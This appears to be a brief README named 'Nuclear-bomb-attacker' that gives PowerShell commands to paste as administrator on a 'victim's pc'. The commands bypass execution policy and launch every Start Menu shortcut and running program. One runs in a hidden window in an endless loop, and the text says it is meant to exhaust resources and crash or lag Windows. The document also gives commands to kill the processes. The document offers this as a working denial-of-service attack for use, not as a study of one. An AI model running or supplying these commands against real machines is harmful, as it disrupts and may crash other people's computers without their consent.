# Nuclear-bomb-attacker


#Run Powershell as adminsitration on victim's pc and paste 

'''powershell -ExecutionPolicy Bypass -Command "Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs','C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs' -Recurse -Include *.lnk | ForEach { Start-Process $_.FullName -ErrorAction SilentlyContinue }; Get-Process | Where {$_.ProcessName -notin @('powershell','cmd','explorer')} | ForEach { Start-Process $_.MainModule.FileName -ErrorAction SilentlyContinue }"'''


#Even more dangerous [ 100+ apps opening = instant DoS, tests process limits, resource exhaustion detection. Windows will lag/crash under 200+ processes ] Paste

powershell -w hidden -ep bypass -c "while(1){ gci 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs','$env:APPDATA\Microsoft\Windows\Start Menu\Programs' -r -fi *.lnk | % { sp $_.fullname -ea 0 }; slp 5 }"


#To stop all Paste 

taskkill /f /im powershell.exe
wmic process where name="powershell.exe" delete



